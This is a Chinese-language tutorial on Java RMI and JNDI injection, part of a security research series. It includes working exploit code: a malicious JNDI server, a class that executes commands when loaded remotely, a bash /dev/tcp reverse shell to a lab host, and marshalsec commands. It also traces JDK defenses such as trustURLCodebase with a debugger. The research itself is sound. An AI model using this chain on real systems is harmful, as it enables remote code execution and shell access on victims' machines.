标题: Java RMI入门(3)

创建: 2020-03-12 17:17
更新: 2020-04-01 16:50
链接: http://scz.617.cn:8/network/202003121717.txt

--------------------------------------------------------------------------

目录:

    ☆ 前言
    ☆ Java RMI
       15) Binding a Remote Object by Using a Reference
           15.1) RemoteReferenceServer.java
           15.2) 测试
           15.3) 切割RemoteReferenceServer
               15.3.1) RemoteReferenceServerA.java
               15.3.2) RemoteReferenceServerB.java
    ☆ JNDI注入
        1) ExploitObject.java
        2) EvilServer.java
        3) VulnerableClient.java
        4) 测试(RMI)
            4.1) 为什么Java 8u232失败
            4.2) ExploitObject()调用栈回溯
        5) ConnectShell.java
        6) 测试(LDAP)
            6.0) 用marshalsec测试成功
            6.1) 用ldap-server.jar测试失败
                6.1.1) 用marshalsec测试时的调用栈回溯
                6.1.2) 调试用ldap-server.jar的情形
                6.1.3) EvilServer2.java
                6.1.4) EvilServer3.java (最普适)
        8) org.springframework.transaction.jta.JtaTransactionManager
            8.1) VulnerableServer.java
            8.2) EvilServer3.java
            8.3) ExploitObject.java
            8.4) EvilClient.java
            8.5) 测试
                8.5.1) ExploitObject()调用栈回溯
    ☆ 参考资源

--------------------------------------------------------------------------

☆ 前言

参看

《Java RMI入门》
http://scz.617.cn:8/network/202002221000.txt

《Java RMI入门(2)》
http://scz.617.cn:8/network/202003081810.txt

《Java RMI入门(4)》
http://scz.617.cn:8/network/202003191728.txt

《Java RMI入门(5)》
http://scz.617.cn:8/network/202003241127.txt

《Java RMI入门(6)》
http://scz.617.cn:8/network/202004011650.txt

本篇复用了系列(1)中的HelloRMIInterfaceImpl8、HelloRMIClient6等。

15) Binding a Remote Object by Using a Reference

参[44]

此次测试方案故意设计得比较复杂，要求很多前置知识，就是迫使你理解隐藏在背后
的方方面面。如欲复现，切勿自作聪明擅自改动测试步骤，尽可能一一映射式地照搬。

15.1) RemoteReferenceServer.java

```java
/*
 * javac -encoding GBK -g RemoteReferenceServer.java
 */
import javax.naming.*;
import java.rmi.server.UnicastRemoteObject;

public class RemoteReferenceServer
{
    public static void main ( String[] argv ) throws Exception
    {
        /*
         * cn=any
         */
        String              name            = argv[0];
        /*
         * rmi://192.168.65.23:1099/some
         */
        String              name_redirect   = argv[1];
        Context             ctx             = new InitialContext();
        HelloRMIInterface   obj             = new HelloRMIInterfaceImpl8();
        HelloRMIInterface   hello           = ( HelloRMIInterface )UnicastRemoteObject.exportObject( obj, 0 );
        /*
         * bind to rmiregistry
         *
         * the RMI URL will redirect request to the RMI registry provider
         */
        ctx.rebind( name_redirect, hello );
        /*
         * https://docs.oracle.com/javase/8/docs/api/javax/naming/Reference.html
         */
        Reference           hello_ref       = new Reference
        (
            /*
             * 对应HelloRMIInterface.class，根据name_redirect取回来的obj可
             * 以强制类型转换成该类。
             */
            "HelloRMIInterface",
            /*
             * 第一形参是自定义字符串，任意内容
             */
            new StringRefAddr( "URL", name_redirect )
        );
        ctx.rebind( name, hello_ref );
    }
}
```
15.2) 测试

假设目录结构是:

.
|
+---test0
|       jndi.ldif
|       ldap-server.jar
|
+---test1
|       HelloRMIInterface.class
|       HelloRMIInterfaceImpl8.class
|       RemoteReferenceServer.class
|
+---test2
|       HelloRMIClient6.class
|       HelloRMIInterface.class
|
\---testserverbase
        HelloRMIInterface.class

各目录下有哪些.class是精心设计过的，不要多也不要少。

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test0目录依次执行:

rmiregistry -J-Djava.rmi.server.useCodebaseOnly=false 1099
java -jar ldap-server.jar -a -b 192.168.65.23 -p 10389 jndi.ldif

useCodebaseOnly必须为false，否则rmiregistry找不到HelloRMIInterface.class。

在test1目录执行:

java \
-Djava.rmi.server.codebase=http://192.168.65.23:8080/testserverbase/ \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
RemoteReferenceServer cn=any rmi://192.168.65.23:1099/some

假设尚未缓存，HTTP Server中会看到:

"GET /testserverbase/HelloRMIInterface.class HTTP/1.1" 200

这是"ctx.rebind(name_redirect,hello)"触发的。

在test2目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
HelloRMIClient6 cn=any "msg from client"

客户端不涉及codebase，不涉及HTTP请求，不需要设置useCodebaseOnly。测试正常，
客户端输出:

[msg from client]

在test1目录以调试方式启动服务端:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Djava.rmi.server.codebase=http://192.168.65.23:8080/testserverbase/ \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
RemoteReferenceServer cn=any rmi://192.168.65.23:1099/some

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in HelloRMIInterfaceImpl8.Echo

有命中。

15.3) 切割RemoteReferenceServer

15.3.1) RemoteReferenceServerA.java

```java
/*
 * javac -encoding GBK -g RemoteReferenceServerA.java
 */
import javax.naming.*;
import java.rmi.server.UnicastRemoteObject;

public class RemoteReferenceServerA
{
    public static void main ( String[] argv ) throws Exception
    {
        String              name_redirect   = argv[0];
        Context             ctx             = new InitialContext();
        HelloRMIInterface   obj             = new HelloRMIInterfaceImpl8();
        HelloRMIInterface   hello           = ( HelloRMIInterface )UnicastRemoteObject.exportObject( obj, 0 );
        ctx.rebind( name_redirect, hello );
    }
}
```

15.3.2) RemoteReferenceServerB.java

```java
/*
 * javac -encoding GBK -g RemoteReferenceServerB.java
 */
import javax.naming.*;
import java.rmi.server.UnicastRemoteObject;

public class RemoteReferenceServerB
{
    public static void main ( String[] argv ) throws Exception
    {
        String              name            = argv[0];
        String              name_redirect   = argv[1];
        Context             ctx             = new InitialContext();
        Reference           hello_ref       = new Reference
        (
            "HelloRMIInterface",
            new StringRefAddr( "URL", name_redirect )
        );
        ctx.rebind( name, hello_ref );
        System.in.read();
    }
}
```

B与A不同，B必须显式阻塞以免进程结束。

假设目录结构是:

.
|
+---test0
|       jndi.ldif
|       ldap-server.jar
|
+---test3
|       HelloRMIInterface.class
|       HelloRMIInterfaceImpl8.class
|       RemoteReferenceServerA.class
|
+---test4
|       RemoteReferenceServerB.class
|
+---test2
|       HelloRMIClient6.class
|       HelloRMIInterface.class
|
\---testserverbase
        HelloRMIInterface.class

在test3目录执行:

java \
-Djava.rmi.server.codebase=http://192.168.65.23:8080/testserverbase/ \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
RemoteReferenceServerA rmi://192.168.65.23:1099/some

在test4目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
RemoteReferenceServerB cn=any rmi://192.168.65.23:1099/some

HelloRMIInterfaceImpl8.Echo()是在A进程空间被执行的，与B进程空间无关，可以
下断点确认。

在test2目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
HelloRMIClient6 cn=any "msg from client"

☆ JNDI注入

参[39]，2016年BlackHat大会上有篇议题讲了JNDI注入。这种类型的洞影响的是JNDI
客户端，不是JNDI服务端。

1) ExploitObject.java

```java
/*
 * javac -encoding GBK -g ExploitObject.java
 */
import java.io.*;

public class ExploitObject
{
    public ExploitObject ()
    {
        try
        {
            System.out.println( "scz is here" );
            Runtime.getRuntime().exec( new String[] { "/bin/bash", "-c", "/bin/touch /tmp/scz_is_here" } );
        }
        catch ( IOException e )
        {
            e.printStackTrace();
        }
    }
}
```

这是将来在JNDI客户端被执行的恶意代码。

2) EvilServer.java

```java
/*
 * javac -encoding GBK -g -XDignore.symbol.file EvilServer.java
 *
 * 为了抑制这个编译时警告，Java 8可以指定"-XDignore.symbol.file"
 *
 * warning: ReferenceWrapper is internal proprietary API and may be removed in a future release
 */
import javax.naming.*;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class EvilServer
{
    public static void main ( String[] argv ) throws Exception
    {
        String              name            = argv[0];
        String              factoryLocation = argv[1];
        String              factory         = argv[2];
        Context             ctx             = new InitialContext();
        /*
         * https://docs.oracle.com/javase/8/docs/api/javax/naming/Reference.html
         *
         * className       The non-null class name of the object to which this reference refers.
         * factory         The possibly null class name of the object's factory.
         * factoryLocation The possibly null location from which to load the factory (e.g. URL)
         */
        Reference           ref             = new Reference
        (
            /*
             * 对应ExploitObject.class。本来第一形参、第二形参是不同的，但
             * 我们只是为了有机会自动执行ExploitObject的构造函数。
             */
            factory,
            factory,
            factoryLocation
        );
        /*
         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/rmi/registry/ReferenceWrapper.java
         *
         * 这是个内部API，所以没有官方API文档可查，只能看源码的注释
         */
        ReferenceWrapper    obj             = new ReferenceWrapper( ref );
        ctx.rebind( name, obj );
    }
}
```

这是攻击者可控的恶意JNDI服务端。

3) VulnerableClient.java

```java
/*
 * javac -encoding GBK -g VulnerableClient.java
 */
import javax.naming.*;

public class VulnerableClient
{
    public static void main ( String[] argv ) throws Exception
    {
        String  name    = argv[0];
        Context ctx     = new InitialContext();
        ctx.lookup( name );
    }
}
```

这是攻击者可控的恶意JNDI服务端。后面我们会讨论ReferenceWrapper完全不必要出
现。

4) 测试(RMI)

假设目录结构是:

.
|
+---test0
+---test1
|       EvilServer.class
|
+---test2
|       VulnerableClient.class
|
\---testserverbase
        ExploitObject.class

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test0目录执行:

rmiregistry 1099

rmiregistry无需设置useCodebaseOnly

在test1目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
EvilServer any http://192.168.65.23:8080/testserverbase/ ExploitObject

在test2目录执行:

java_8_40 \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
VulnerableClient any

scz is here
Exception in thread "main" javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory]
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:472)
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124)
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:128)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at VulnerableClient.main(VulnerableClient.java:12)
Caused by: java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory
        at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
        at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464)
        ... 4 more

或

java_8_40 \
VulnerableClient rmi://192.168.65.23:1099/any

scz is here
Exception in thread "main" javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory]
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:472)
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124)
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at VulnerableClient.main(VulnerableClient.java:12)
Caused by: java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory
        at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
        at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464)
        ... 4 more

上面两个调用栈回溯有细微差别。虽然抛出异常，但恶意构造函数ExploitObject()
已被执行。HTTP Server中会看到:

"GET /testserverbase/ExploitObject.class HTTP/1.1" 200

这是客户端发出的GET请求。如果客户端本地CLASSPATH中已有ExploitObject.class，
就不会从远程下载，本地ExploitObject.class将被加载使用。

4.1) 为什么Java 8u232失败

在test2目录执行:

java \
VulnerableClient rmi://192.168.65.23:1099/any

抛出异常:

Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at VulnerableClient.main(VulnerableClient.java:12)

参[45]，KINGX说这是Java 8u113的安全增强。参:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/rmi/registry/RegistryContext.java

在test2目录执行:

java \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
VulnerableClient rmi://192.168.65.23:1099/any

没有抛异常，无声无息结束，没有触发GET请求，恶意构造函数ExploitObject()未被
执行。

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
VulnerableClient rmi://192.168.65.23:1099/any

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

或者用Eclipse跟踪。在下面这个位置还有一次对trustURLCodebase的检查，但这次
取的是"com.sun.jndi.ldap.object.trustURLCodebase"。

Thread [main] (Suspended (breakpoint at line 101 in com.sun.naming.internal.VersionHelper12))
    com.sun.naming.internal.VersionHelper12.loadClass(java.lang.String, java.lang.String) line: 101
    javax.naming.spi.NamingManager.getObjectFactoryFromReference(javax.naming.Reference, java.lang.String) line: 158
    javax.naming.spi.NamingManager.getObjectInstance(java.lang.Object, javax.naming.Name, javax.naming.Context, java.util.Hashtable<?,?>) line: 319
    com.sun.jndi.rmi.registry.RegistryContext.decodeObject(java.rmi.Remote, javax.naming.Name) line: 499
    com.sun.jndi.rmi.registry.RegistryContext.lookup(javax.naming.Name) line: 138
    com.sun.jndi.url.rmi.rmiURLContext(com.sun.jndi.toolkit.url.GenericURLContext).lookup(java.lang.String) line: 205
    javax.naming.InitialContext.lookup(java.lang.String) line: 417
    VulnerableClient.main(java.lang.String[]) line: 12

如果"com.sun.jndi.ldap.object.trustURLCodebase"为false，loadClass()返回
null，后面的流程不会抛出异常，真坑啊。

参:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/naming/internal/VersionHelper12.java

上面的测试用例与LDAP没有毛关系，但为了让Java 8u232成功，必须同时设置两个
trustURLCodebase:

java \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient rmi://192.168.65.23:1099/any

scz is here
Exception in thread "main" javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory]
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:507)
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at VulnerableClient.main(VulnerableClient.java:12)
Caused by: java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory
        at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
        at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
        ... 4 more

KINGX在[45]中写了一段话:

--------------------------------------------------------------------------
测试过程中有个细节，我们在JDK 8u102中使用RMI Server + JNDI Reference可以成
功利用，而此时我们手工将com.sun.jndi.rmi.object.trustURLCodebase等属性设置
为false，并不会如预期一样有高版本JDK的限制效果出现，Payload依然可以利用。
--------------------------------------------------------------------------

这其实很正常。未看8u102的rt.jar，就以8u40的rt.jar为例，后者的
RegistryContext.decodeObject()中干脆就没有trustURLCodebase相关代码，直接调
了NamingManager.getObjectInstance()。同样，8u40的
VersionHelper12.loadClass()中没有trustURLCodebase相关代码，直接开始调
getContextClassLoader()。换句话说，做安全增强时才引入两个trustURLCodebase
变量，这种情况下对安全增强之前的版本将trustURLCodebase设为啥都无意义。

4.2) ExploitObject()调用栈回溯

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient rmi://192.168.65.23:1099/any

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in ExploitObject.<init>

  [1] ExploitObject.<init> (ExploitObject.java:9), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
  [7] javax.naming.spi.NamingManager.getObjectFactoryFromReference (NamingManager.java:163), pc = 46
  [8] javax.naming.spi.NamingManager.getObjectInstance (NamingManager.java:319), pc = 94
  [9] com.sun.jndi.rmi.registry.RegistryContext.decodeObject (RegistryContext.java:499), pc = 97
  [10] com.sun.jndi.rmi.registry.RegistryContext.lookup (RegistryContext.java:138), pc = 75
  [11] com.sun.jndi.toolkit.url.GenericURLContext.lookup (GenericURLContext.java:205), pc = 23
  [12] javax.naming.InitialContext.lookup (InitialContext.java:417), pc = 6
  [13] VulnerableClient.main (VulnerableClient.java:12), pc = 14

5) ConnectShell.java

```java
/*
 * javac -encoding GBK -g ConnectShell.java
 */
import java.io.*;

public class ConnectShell
{
    public ConnectShell ()
    {
        try
        {
            /*
             * exec()效果相当于:
             *
             * nc -n 192.168.65.23 7474 -e /bin/sh

             * 需要在192.168.65.23上配合执行:
             *
             * nc -l -p 7474
             */
            Runtime.getRuntime().exec( new String[] { "/bin/sh", "-c", "/bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1" } );
        }
        catch ( IOException e )
        {
            e.printStackTrace();
        }
    }
}
```

参看:

《非常规手段上传下载二进制文件》
http://scz.617.cn:8/unix/200007171457.txt

bash支持/dev/tcp时只用到connect(2)，没有用bind(2)，因此只能主动连接，不能
被动侦听。若所在主机不允许主动外连，无法使用/dev/tcp。

在192.168.65.23任意目录执行:

nc -l -p 7474

等待VulnerableClient主动来连。

在test1目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
EvilServer any http://192.168.65.23:8080/testserverbase/ ConnectShell

恶意JNDI服务端此次向JNDI客户端投递恶意类ConnectShell，而不是ExploitObject。

在test2目录执行:

java \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient rmi://192.168.65.23:1099/any

回到前面那个nc，已经得到一个shell，其uid对应VulnerableClient进程的euid。

6) 测试(LDAP)

6.0) 用marshalsec测试成功

假设目录结构是:

.
|
+---test0
|       marshalsec-0.0.3-SNAPSHOT-all.jar
|
+---test2
|       VulnerableClient.class
|
\---testserverbase
        ExploitObject.class

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test0目录执行:

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.65.23:8080/testserverbase/#ExploitObject 10389

参[17]，可以自己编译marshalsec。

参[45]，KINGX演示了如何利用marshalsec提供恶意LDAP服务:

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase_url#classname> [<port>]

如果用marshalsec，就不需要ldap-server.jar和EvilServer.class，marshalsec身
兼多职。

在test2目录执行:

java_8_40 \
VulnerableClient ldap://192.168.65.23:10389/any

或

java \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient ldap://192.168.65.23:10389/any

scz is here
Exception in thread "main" javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'any'
        at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)
        at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
        at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
        at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at VulnerableClient.main(VulnerableClient.java:12)
Caused by: java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory
        at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
        at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)
        at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)
        ... 6 more

与"com.sun.jndi.rmi.object.trustURLCodebase"无关，只需要设置
"com.sun.jndi.ldap.object.trustURLCodebase"。8u191做的安全增强。

6.1) 用ldap-server.jar测试失败

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test0目录执行:

java -jar ldap-server.jar -a -b 192.168.65.23 -p 10389 jndi.ldif

在test1目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
EvilServer cn=any http://192.168.65.23:8080/testserverbase/ ExploitObject

在test2目录执行:

java \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient ldap://192.168.65.23:10389/cn=any,o=anything,dc=evil,dc=com

没有抛异常，无声无息结束，没有触发GET请求，恶意构造函数ExploitObject()未被
执行。

6.1.1) 用marshalsec测试时的调用栈回溯

在test0目录执行:

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.65.23:8080/testserverbase/#ExploitObject 10389

在test2目录执行:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient ldap://192.168.65.23:10389/any

用Eclipse的条件断点断下来，查看调用栈回溯:

(new String(b)).startsWith("GET /testserverbase/ExploitObject.class")

Thread [main] (Suspended (breakpoint at line 101 in java.net.SocketOutputStream))
    java.net.SocketOutputStream.socketWrite(byte[], int, int) line: 101
    java.net.SocketOutputStream.write(byte[], int, int) line: 155
    java.io.BufferedOutputStream.flushBuffer() line: 82
    java.io.BufferedOutputStream.flush() line: 140
    java.io.PrintStream.flush() line: 338
    sun.net.www.MessageHeader.print(java.io.PrintStream) line: 301
    sun.net.www.http.HttpClient.writeRequests(sun.net.www.MessageHeader, sun.net.www.http.PosterOutputStream) line: 644
    sun.net.www.http.HttpClient.writeRequests(sun.net.www.MessageHeader, sun.net.www.http.PosterOutputStream, boolean) line: 655
    sun.net.www.protocol.http.HttpURLConnection.writeRequests() line: 694
    sun.net.www.protocol.http.HttpURLConnection.getInputStream0() line: 1591
    sun.net.www.protocol.http.HttpURLConnection.getInputStream() line: 1498
    sun.misc.URLClassPath$Loader.getResource(java.lang.String, boolean) line: 747
    sun.misc.URLClassPath.getResource(java.lang.String, boolean) line: 249
    java.net.URLClassLoader$1.run() line: 366
    java.net.URLClassLoader$1.run() line: 363
    java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
    java.net.FactoryURLClassLoader(java.net.URLClassLoader).findClass(java.lang.String) line: 362
    java.net.FactoryURLClassLoader(java.lang.ClassLoader).loadClass(java.lang.String, boolean) line: 418
    java.net.FactoryURLClassLoader.loadClass(java.lang.String, boolean) line: 817
    java.net.FactoryURLClassLoader(java.lang.ClassLoader).loadClass(java.lang.String) line: 351
    java.lang.Class<T>.forName0(java.lang.String, boolean, java.lang.ClassLoader, java.lang.Class<?>) line: not available [native method]
    java.lang.Class<T>.forName(java.lang.String, boolean, java.lang.ClassLoader) line: 348
    com.sun.naming.internal.VersionHelper12.loadClass(java.lang.String, java.lang.ClassLoader) line: 91
    com.sun.naming.internal.VersionHelper12.loadClass(java.lang.String, java.lang.String) line: 106
    javax.naming.spi.NamingManager.getObjectFactoryFromReference(javax.naming.Reference, java.lang.String) line: 158
    javax.naming.spi.DirectoryManager.getObjectInstance(java.lang.Object, javax.naming.Name, javax.naming.Context, java.util.Hashtable<?,?>, javax.naming.directory.Attributes) line: 189
    com.sun.jndi.ldap.LdapCtx.c_lookup(javax.naming.Name, com.sun.jndi.toolkit.ctx.Continuation) line: 1085
    com.sun.jndi.ldap.LdapCtx(com.sun.jndi.toolkit.ctx.ComponentContext).p_lookup(javax.naming.Name, com.sun.jndi.toolkit.ctx.Continuation) line: 542
    com.sun.jndi.ldap.LdapCtx(com.sun.jndi.toolkit.ctx.PartialCompositeContext).lookup(javax.naming.Name) line: 177
    com.sun.jndi.url.ldap.ldapURLContext(com.sun.jndi.toolkit.url.GenericURLContext).lookup(java.lang.String) line: 205
    com.sun.jndi.url.ldap.ldapURLContext.lookup(java.lang.String) line: 94
    javax.naming.InitialContext.lookup(java.lang.String) line: 417
    VulnerableClient.main(java.lang.String[]) line: 12

6.1.2) 调试用ldap-server.jar的情形

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient ldap://192.168.65.23:10389/cn=any,o=anything,dc=evil,dc=com

可以先利用前面那个调用栈回溯将断点设置好，不然手工去找这些位置太费劲。说一
下调试思路，两种情形，一种成功，一种失败，肯定是流程在某处分了岔，把这个岔
路口找出来。利用成功情形的调用栈回溯设置一堆断点，跑失败情形，快速找到最后
一个相同的命中点:

com.sun.jndi.ldap.LdapCtx.c_lookup(javax.naming.Name, com.sun.jndi.toolkit.ctx.Continuation) line: 1085

此处对应代码:

return DirectoryManager.getObjectInstance(obj, name, this, envprops, attrs);

重新调试失败情形，从这个位置开始单步。参:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/javax/naming/spi/DirectoryManager.java

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment, Attributes attrs)
    throws Exception {

        ObjectFactory factory;

        ObjectFactoryBuilder builder = getObjectFactoryBuilder();
        if (builder != null) {
            // builder must return non-null factory
            factory = builder.createObjectFactory(refInfo, environment);
            if (factory instanceof DirObjectFactory) {
                return ((DirObjectFactory)factory).getObjectInstance(
                    refInfo, name, nameCtx, environment, attrs);
            } else {
                return factory.getObjectInstance(refInfo, name, nameCtx,
                    environment);
            }
        }

        // use reference if possible
        Reference ref = null;
        /*
         * 176行，分岔点在此。成功情形，refInfo是Reference；失败情形，refInfo
         * 是ReferenceWrapper，既不是Reference，也不是Referenceable，导致
         * ref为null。
         */
        if (refInfo instanceof Reference) {
            ref = (Reference) refInfo;
        } else if (refInfo instanceof Referenceable) {
            ref = ((Referenceable)(refInfo)).getReference();
        }

        Object answer;
        /*
         * 184行，失败情形流程至此时ref为null
         */
        if (ref != null) {
            String f = ref.getFactoryClassName();
            if (f != null) {
                // if reference identifies a factory, use exclusively
                /*
                 * 189行，成功情形流程会至此，失败情形流程不会至此
                 */
                factory = getObjectFactoryFromReference(ref, f);
                if (factory instanceof DirObjectFactory) {
                    return ((DirObjectFactory)factory).getObjectInstance(
                        ref, name, nameCtx, environment, attrs);
                } else if (factory != null) {
                    return factory.getObjectInstance(ref, name, nameCtx,
                                                     environment);
                }
                // No factory found, so return original refInfo.
                // Will reach this point if factory class is not in
                // class path and reference does not contain a URL for it
                return refInfo;

            } else {
                // if reference has no factory, check for addresses
                // containing URLs
                // ignore name & attrs params; not used in URL factory

                answer = processURLAddrs(ref, name, nameCtx, environment);
                if (answer != null) {
                    return answer;
                }
            }
        }

        // try using any specified factories
        answer = createObjectFromFactories(refInfo, name, nameCtx,
                                           environment, attrs);
        return (answer != null) ? answer : refInfo;
}
```
参:

--------------------------------------------------------------------------
https://docs.oracle.com/javase/8/docs/api/javax/naming/Reference.html
http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/javax/naming/Reference.java

https://docs.oracle.com/javase/8/docs/api/javax/naming/Referenceable.html
http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/javax/naming/Referenceable.java

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/rmi/registry/ReferenceWrapper.java
--------------------------------------------------------------------------

